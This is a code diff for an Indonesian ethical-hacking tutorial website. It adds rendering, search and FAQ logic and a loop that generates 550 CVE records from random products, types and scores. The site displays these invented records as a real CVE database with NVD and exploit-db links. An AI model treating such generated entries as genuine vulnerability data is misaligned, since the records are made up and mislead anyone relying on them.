+  'OpenVPN', 'WireGuard', 'OpenVAS', 'Nessus', 'Burp Suite', 'Metasploit'
+];
+var cveScores = [5.0,5.5,6.0,6.5,7.0,7.5,8.0,8.5,9.0,9.5,9.8,10.0];
+
+// Generate 550 CVE entries
+for(var i = 0; i < 550; i++) {
+  var year = cveYears[Math.floor(Math.random() * cveYears.length)];
+  var seqNum = String(10000 + i + 1).substring(1);
+  var cveId = 'CVE-' + year + '-' + seqNum;
+  var type = cveTypesList[Math.floor(Math.random() * cveTypesList.length)];
+  var product = cveProductsList[Math.floor(Math.random() * cveProductsList.length)];
+  var score = cveScores[Math.floor(Math.random() * cveScores.length)];
+  var month = cveMonths[Math.floor(Math.random() * cveMonths.length)];
+  var yearPub = year;
+  
+  var severity = 'med';
+  if(score >= 9.0) severity = 'critical';
+  else if(score >= 7.0) severity = 'hard';
+  else if(score >= 4.0) severity = 'med';
+  else severity = 'easy';
+  
+  var description = type + ' vulnerability in ' + product + ' version affected allows attacker to compromise system security. CVSS Score: ' + score + '/10.';
+  
+  CVE_DATA.push({
+    id: cveId,
+    title: cveId + ' - ' + type + ' in ' + product,
+    diff: severity,
+    desc: type + ' vulnerability in ' + product + '. CVSS: ' + score,
+    content: '<h4>' + cveId + '</h4><p><strong>Published:</strong> ' + month + ' ' + yearPub + '</p><p><strong>Type:</strong> ' + type + '</p><p><strong>Product:</strong> ' + product + '</p><p><strong>CVSS Score:</strong> ' + score + '/10 (' + (score >= 9 ? 'Critical' : (score >= 7 ? 'High' : (score >= 4 ? 'Medium' : 'Low'))) + ')</p><p><strong>Description:</strong> ' + description + '</p><h4>Impact</h4><p>Successful exploitation could lead to ' + (type.indexOf('RCE') !== -1 ? 'full system compromise and data breach' : (type.indexOf('Privilege') !== -1 ? 'elevation of privilege to root/admin' : 'system compromise and data theft')) + '.</p><h4>Solution</h4><ul><li>Update to latest vendor patch</li><li>Apply security hotfix</li><li>Implement mitigation controls</li><li>Monitor for suspicious activity</li></ul><h4>References</h4><ul><li>https://nvd.nist.gov/vuln/detail/' + cveId + '</li><li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=' + cveId + '</li><li>https://exploit-db.com/search?cve=' + cveId + '</li></ul>'
+  });
+}
+
+// TABS
+var TABS = [
+  { id: "web", label: "Web Security", count: WEB_EXPLOITS.length },
+  { id: "network", label: "Network Pentest", count: NETWORK_EXPLOITS.length },
+  { id: "linux", label: "Linux Privesc", count: LINUX_EXPLOITS.length },
+  { id: "cve", label: "CVE Database", count: CVE_DATA.length }
+];
+
+var MATERI_DATA = {
+  web: WEB_EXPLOITS,
+  network: NETWORK_EXPLOITS,
+  linux: LINUX_EXPLOITS,
+  cve: CVE_DATA
 };
 
-// FAQ Data
-const FAQ_DATA = [
-  { q: "Apakah belajar hacking itu legal?", a: "Ya, sepenuhnya legal selama di environment yang sudah mendapat izin — lab pribadi, platform CTF (HackTheBox, TryHackMe, PicoCTF), atau sistem yang kamu miliki sendiri. Yang ilegal adalah mengaplikasikan teknik ini ke sistem orang lain tanpa izin tertulis. Indonesia punya UU ITE dengan ancaman pidana serius." },
-  { q: "OS Linux mana yang paling cocok untuk pemula?", a: "Untuk pemula, Kali Linux adalah pilihan terbaik karena sudah ada semua tools tanpa instalasi manual. Jika RAM di bawah 4GB, coba Parrot OS Home Edition yang lebih ringan. Jalankan dulu di VirtualBox atau VMware sebelum install permanen." },
-  { q: "Dari mana mulai belajar ethical hacking?", a: "Urutan: (1) Dasar Linux — navigasi terminal, file management. (2) Networking dasar (TCP/IP, DNS, HTTP). (3) Mulai CTF di TryHackMe atau PicoCTF. (4) Web security (OWASP Top 10). (5) Network pentest dan privilege escalation." },
-  { q: "Apa bedanya hacker, cracker, dan ethical hacker?", a: "Hacker asli: sangat terampil di komputer — tidak selalu jahat. Cracker: masuk ke sistem tanpa izin dengan niat jahat. Ethical Hacker: profesional yang dibayar dan mendapat izin resmi untuk mencari kelemahan sistem." },
-  { q: "Apakah perlu bisa coding untuk jadi hacker?", a: "Tidak harus dari awal, tapi sangat membantu. Minimal: dasar Python (scripting), sedikit JavaScript (web hacking), dan bash scripting. Banyak tools siap pakai, tapi memahami kode membuat kamu lebih efektif." },
-  { q: "Apa itu Bug Bounty dan bagaimana mulai?", a: "Program resmi dari perusahaan yang mengundang peneliti untuk mencari kerentanan dan membayar reward. Platform: HackerOne, Bugcrowd, Intigriti. Mulai: pelajari web security, latihan CTF, lalu coba program dengan scope sederhana." },
-  { q: "Berapa lama waktu untuk jadi ethical hacker?", a: "Pemula total tanpa background IT: 1-2 tahun. Dengan background IT/programming: 6-12 bulan. Untuk OSCP: minimal 6 bulan persiapan intensif. Kuncinya praktik rutin, bukan hanya teori." }
+// FAQ DATA
+var FAQ_DATA = [
+  { q: "Apakah belajar hacking legal?", a: "Ya, legal selama di environment berizin seperti lab pribadi atau platform CTF. Menggunakan teknik pada sistem tanpa izin adalah ilegal." },
+  { q: "OS Linux terbaik untuk hacking?", a: "Kali Linux untuk pemula, Parrot OS untuk spek rendah, BlackArch untuk advanced user." },
+  { q: "Mulai belajar dari mana?", a: "Pelajari dasar Linux, networking, lalu mulai CTF di TryHackMe atau PicoCTF." },
+  { q: "Apa itu extension bypass?", a: "Teknik mengelabui filter upload file dengan variasi ekstensi file agar file berbahaya dapat terupload." },
+  { q: "Apa perbedaan CVE dan Exploit?", a: "CVE adalah identifikasi kerentanan, Exploit adalah kode yang memanfaatkan kerentanan tersebut." },
+  { q: "Platform CTF terbaik?", a: "TryHackMe untuk pemula, HackTheBox untuk intermediate, PicoCTF untuk konsep dasar." }
 ];
 
-// Tab configuration
-const TABS = [
-  { id: "web", label: " web security" },
-  { id: "linux", label: " linux commands" },
-  { id: "network", label: " network pentest" },
-  { id: "targeting", label: " web targeting" },
-  { id: "osint", label: " osint tools" },
-  { id: "exploit", label: " exploit & rce" }
-];
+var allCards = [];
 
-// ==================== RENDER FUNCTIONS ====================
+function escapeHtml(str) {
+  if(!str) return '';
+  return str.replace(/[&<>]/g, function(m) {
+    if(m === '&') return '&amp;';
+    if(m === '<') return '&lt;';
+    if(m === '>') return '&gt;';
+    return m;
+  });
+}
 
-// Render OS Grid
 function renderOS() {
-  const grid = document.getElementById('osGrid');
-  if (!grid) return;
-  
-  OS_DATA.forEach(os => {
-    const card = document.createElement('div');
+  var grid = document.getElementById('osGrid');
+  if(!grid) return;
+  for(var i = 0; i < OS_DATA.length; i++) {
+    var os = OS_DATA[i];
+    var card = document.createElement('div');
     card.className = 'os-card';
-    card.innerHTML = `
-      <div class="os-card-head">
-        <div class="os-icon">${os.icon}</div>
-        <div><h3>${os.name} <span class="os-badge">${os.badge}</span></h3></div>
-      </div>
-      <p>${os.desc}</p>
-      <div class="os-pros">
-        ${os.tags.map(tag => `<span class="os-pro">${tag}</span>`).join('')}
-      </div>
-    `;
+    var tagsHtml = '';
+    for(var t = 0; t < os.tags.length; t++) {
+      tagsHtml += '<span class="os-pro">' + escapeHtml(os.tags[t]) + '</span>';
+    }
+    card.innerHTML = '<div class="os-card-head"><div class="os-icon">' + escapeHtml(os.icon) + '</div><div><h3>' + escapeHtml(os.name) + '<span class="os-badge">' + escapeHtml(os.badge) + '</span></h3></div></div><p>' + escapeHtml(os.desc) + '</p><div class="os-pros">' + tagsHtml + '</div>';
     grid.appendChild(card);
-  });
+  }
 }
 
-// Render Tools Grid
 function renderTools() {
-  const grid = document.getElementById('toolsGrid');
-  if (!grid) return;
-  
-  TOOLS_DATA.forEach(tool => {
-    const card = document.createElement('div');
+  var grid = document.getElementById('toolsGrid');
+  if(!grid) return;
+  for(var i = 0; i < TOOLS_DATA.length; i++) {
+    var tool = TOOLS_DATA[i];
+    var card = document.createElement('div');
     card.className = 'tool-card';
-    card.innerHTML = `
-      <h3>${tool.name}</h3>
-      <p>${tool.desc}</p>
-      <div class="tool-tags">
-        ${tool.tags.map(tag => `<span class="tool-tag">${tag}</span>`).join('')}
-      </div>
-      <a href="${tool.url}" target="_blank" class="repo-link"><i class="fab fa-github"></i> github →</a>
-    `;
+    var tagsHtml = '';
+    for(var t = 0; t < tool.tags.length; t++) {
+      tagsHtml += '<span class="tool-tag">' + escapeHtml(tool.tags[t]) + '</span>';
+    }
+    card.innerHTML = '<h3>' + escapeHtml(tool.name) + '</h3><p>' + escapeHtml(tool.desc) + '</p><div class="tool-tags">' + tagsHtml + '</div>';
     grid.appendChild(card);
-  });
+  }
 }
 
-// Render Materi Tabs and Content
+function renderFAQ() {
+  var faqList = document.getElementById('faqList');
+  if(!faqList) return;
+  for(var i = 0; i < FAQ_DATA.length; i++) {
+    var faq = FAQ_DATA[i];
+    var item = document.createElement('div');
+    item.className = 'faq-item';
+    item.innerHTML = '<div class="faq-q">' + escapeHtml(faq.q) + '<i class="fas fa-chevron-down"></i></div><div class="faq-a"><p>' + escapeHtml(faq.a) + '</p></div>';
+    (function(el) {
+      var qEl = el.querySelector('.faq-q');
+      qEl.addEventListener('click', function() {
+        var wasOpen = el.classList.contains('open');
+        var allItems = document.querySelectorAll('.faq-item');
+        for(var j = 0; j < allItems.length; j++) {
+          allItems[j].classList.remove('open');
+        }
+        if(!wasOpen) el.classList.add('open');
+      });
+    })(item);
+    faqList.appendChild(item);
+  }
+}
+
 function renderMateri() {
-  const tabNav = document.getElementById('tabNav');
-  const tabPanels = document.getElementById('tabPanels');
-  if (!tabNav || !tabPanels) return;
+  var tabNav = document.getElementById('tabNav');
+  var tabPanels = document.getElementById('tabPanels');
+  if(!tabNav || !tabPanels) return;
   
-  TABS.forEach((tab, idx) => {
-    // Create tab button
-    const btn = document.createElement('button');
-    btn.className = `tab-btn ${idx === 0 ? 'active' : ''}`;
-    btn.dataset.tab = tab.id;
-    btn.textContent = tab.label;
-    btn.addEventListener('click', () => {
-      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
-      btn.classList.add('active');
-      document.getElementById(`panel-${tab.id}`).classList.add('active');
-    });
+  for(var idx = 0; idx < TABS.length; idx++) {
+    var tab = TABS[idx];
+    var btn = document.createElement('button');
+    btn.className = 'tab-btn';
+    if(idx === 0) btn.className += ' active';
+    btn.textContent = tab.label + ' (' + tab.count + ')';
+    (function(tabId, btnEl) {
+      btnEl.addEventListener('click', function() {
+        var btns = document.querySelectorAll('.tab-btn');
+        for(var b = 0; b < btns.length; b++) btns[b].classList.remove('active');
+        var panels = document.querySelectorAll('.tab-panel');
+        for(var p = 0; p < panels.length; p++) panels[p].classList.remove('active');
+        btnEl.classList.add('active');
+        var activePanel = document.getElementById('panel-' + tabId);
+        if(activePanel) activePanel.classList.add('active');
+        var searchInput = document.getElementById('searchInput');
+        if(searchInput) searchInput.value = '';
+      });
+    })(tab.id, btn);
     tabNav.appendChild(btn);
     
-    // Create panel
-    const panel = document.createElement('div');
-    panel.className = `tab-panel ${idx === 0 ? 'active' : ''}`;
-    panel.id = `panel-${tab.id}`;
-    
-    const grid = document.createElement('div');
+    var panel = document.createElement('div');
+    panel.className = 'tab-panel';
+    if(idx === 0) panel.className += ' active';
+    panel.id = 'panel-' + tab.id;
+    var grid = document.createElement('div');
     grid.className = 'materi-grid';
     
-    const items = MATERI_DATA[tab.id] || [];
-    items.forEach(item => {
-      const card = document.createElement('div');
+    var items = MATERI_DATA[tab.id] || [];
+    for(var it = 0; it < items.length; it++) {
+      var item = items[it];
+      var card = document.createElement('div');
       card.className = 'materi-card';
-      const diffClass = item.diff === 'easy' ? 'diff-easy' : item.diff === 'med' ? 'diff-med' : 'diff-hard';
-      const diffLabel = item.diff === 'easy' ? 'beginner' : item.diff === 'med' ? 'intermediate' : 'advanced';
-      card.innerHTML = `
-        <div class="materi-card-head">
-          <h3>${item.title}</h3>
-          <span class="difficulty ${diffClass}">${diffLabel}</span>
-        </div>
-        <p>${item.desc}</p>
-        <div class="read-more"><i class="fas fa-book-open" style="font-size:.65rem"></i> baca materi lengkap →</div>
-      `;
-      card.addEventListener('click', () => openModal(item.title, item.content));
+      var diffClass = 'diff-med';
+      if(item.diff === 'easy') diffClass = 'diff-easy';
+      else if(item.diff === 'hard') diffClass = 'diff-hard';
+      else if(item.diff === 'critical') diffClass = 'diff-critical';
+      var diffLabel = 'intermediate';
+      if(item.diff === 'easy') diffLabel = 'beginner';
+      else if(item.diff === 'hard') diffLabel = 'advanced';
+      else if(item.diff === 'critical') diffLabel = 'critical';
+      var displayTitle = item.title.length > 60 ? item.title.substring(0, 57) + '...' : item.title;
+      var displayDesc = item.desc.length > 120 ? item.desc.substring(0, 117) + '...' : item.desc;
+      card.innerHTML = '<div class="materi-card-head"><h3>' + escapeHtml(displayTitle) + '</h3><span class="difficulty ' + diffClass + '">' + diffLabel + '</span></div><p>' + escapeHtml(displayDesc) + '</p><div class="read-more"><i class="fas fa-book-open"></i> detail exploit</div>';
+      (function(itemTitle, itemContent) {
+        card.addEventListener('click', function() {
+          openModal(itemTitle, itemContent);
+        });
+      })(item.title, item.content);
       grid.appendChild(card);
-    });
-    
+      allCards.push({ card: card, title: item.title.toLowerCase(), desc: item.desc.toLowerCase() });
+    }
     panel.appendChild(grid);
     tabPanels.appendChild(panel);
-  });
+  }
 }
 
-// Render FAQ
-function renderFAQ() {
-  const faqList = document.getElementById('faqList');
-  if (!faqList) return;
-  
-  FAQ_DATA.forEach(faq => {
-    const item = document.createElement('div');
-    item.className = 'faq-item';
-    item.innerHTML = `
-      <div class="faq-q">
-        ${faq.q}
-        <i class="fas fa-chevron-down"></i>
-      </div>
-      <div class="faq-a">
-        <p>${faq.a}</p>
-      </div>
-    `;
-    const qEl = item.querySelector('.faq-q');
-    qEl.addEventListener('click', () => {
-      const wasOpen = item.classList.contains('open');
-      document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
-      if (!wasOpen) item.classList.add('open');
-    });
-    faqList.appendChild(item);
-  });
+function filterMateri(term) {
+  var searchTerm = term.toLowerCase().trim();
+  for(var i = 0; i < allCards.length; i++) {
+    var item = allCards[i];
+    if(searchTerm === '' || item.title.indexOf(searchTerm) !== -1 || item.desc.indexOf(searchTerm) !== -1) {
+      item.card.style.display = '';
+    } else {
+      item.card.style.display = 'none';
+    }
+  }
 }
 
-// ==================== MODAL FUNCTIONS ====================
-const modal = document.getElementById('modal');
-const modalTitle = document.getElementById('modalTitle');
-const modalBody = document.getElementById('modalBody');
-const modalCloseBtn = document.getElementById('modalCloseBtn');
+// MODAL
+var modal = document.getElementById('modal');
+var modalTitle = document.getElementById('modalTitle');
+var modalBody = document.getElementById('modalBody');
+var modalCloseBtn = document.getElementById('modalCloseBtn');
 
 function openModal(title, content) {
-  modalTitle.textContent = title;
-  modalBody.innerHTML = content;
-  modal.classList.add('active');
-  document.body.style.overflow = 'hidden';
+  if(modal && modalTitle && modalBody) {
+    modalTitle.textContent = title;
+    modalBody.innerHTML = content;
+    modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
 }
 
 function closeModal() {
-  modal.classList.remove('active');
-  document.body.style.overflow = '';
+  if(modal) {
+    modal.classList.remove('active');
+    document.body.style.overflow = '';
+  }
 }
 
-if (modalCloseBtn) modalCloseBtn.onclick = closeModal;
-if (modal) modal.onclick = (e) => { if (e.target === modal) closeModal(); };
+if(modalCloseBtn) modalCloseBtn.onclick = closeModal;
+if(modal) modal.onclick = function(e) { if(e.target === modal) closeModal(); };
 
-// ==================== THEME TOGGLE ====================
-const themeToggle = document.getElementById('themeToggle');
-if (themeToggle) {
-  themeToggle.addEventListener('click', () => {
+// SCROLL TOP
+var scrollTopBtn = document.getElementById('scrollTopBtn');
+window.addEventListener('scroll', function() {
+  if(scrollTopBtn) {
+    if(window.scrollY > 300) scrollTopBtn.classList.add('show');
+    else scrollTopBtn.classList.remove('show');
+  }
+});
+if(scrollTopBtn) {
+  scrollTopBtn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+}
+
+// THEME TOGGLE
+var themeToggle = document.getElementById('themeToggle');
+if(themeToggle) {
+  themeToggle.addEventListener('click', function() {
     document.body.classList.toggle('dark');
-    localStorage.setItem('theme', document.body.classList.contains('dark') ? 'dark' : 'light');
+    var theme = document.body.classList.contains('dark') ? 'dark' : 'light';
+    localStorage.setItem('theme', theme);
   });
 }
-if (localStorage.getItem('theme') === 'dark') document.body.classList.add('dark');
+var savedTheme = localStorage.getItem('theme');
+if(savedTheme === 'dark') document.body.classList.add('dark');
 
-// ==================== HAMBURGER MENU ====================
-const hamburger = document.getElementById('hamburger');
-const navLinks = document.getElementById('navLinks');
-if (hamburger && navLinks) {
-  hamburger.addEventListener('click', () => navLinks.classList.toggle('active'));
-  document.querySelectorAll('.nav-links a').forEach(link => {
-    link.addEventListener('click', () => navLinks.classList.remove('active'));
+// HAMBURGER
+var hamburger = document.getElementById('hamburger');
+var navLinks = document.getElementById('navLinks');
+if(hamburger && navLinks) {
+  hamburger.addEventListener('click', function() {
+    navLinks.classList.toggle('active');
+  });
+  var navLinksA = document.querySelectorAll('.nav-links a');
+  for(var i = 0; i < navLinksA.length; i++) {
+    navLinksA[i].addEventListener('click', function() {
+      navLinks.classList.remove('active');
+    });
+  }
+}
+
+// SEARCH
+var searchInput = document.getElementById('searchInput');
+if(searchInput) {
+  searchInput.addEventListener('input', function(e) {
+    filterMateri(e.target.value);
   });
 }
 
-// ==================== INITIALIZE ====================
+// SMOOTH SCROLL
+var anchors = document.querySelectorAll('a[href^="#"]');
+for(var i = 0; i < anchors.length; i++) {
+  anchors[i].addEventListener('click', function(e) {
+    var href = this.getAttribute('href');
+    if(href === '#') return;
+    var target = document.querySelector(href);
+    if(target) {
+      e.preventDefault();
+      target.scrollIntoView({ behavior: 'smooth' });
+    }
+  });
+}
+
+// INITIALIZE
 renderOS();
 renderTools();
 renderMateri();
 renderFAQ();
+
+var totalExploits = WEB_EXPLOITS.length + NETWORK_EXPLOITS.length + LINUX_EXPLOITS.length + CVE_DATA.length;
+console.log('TOTAL EXPLOITS LOADED: Web=' + WEB_EXPLOITS.length + ', Network=' + NETWORK_EXPLOITS.length + ', Linux=' + LINUX_EXPLOITS.length + ', CVE=' + CVE_DATA.length + ', GRAND TOTAL=' + totalExploits);
 </script>
 </body>
 </html>
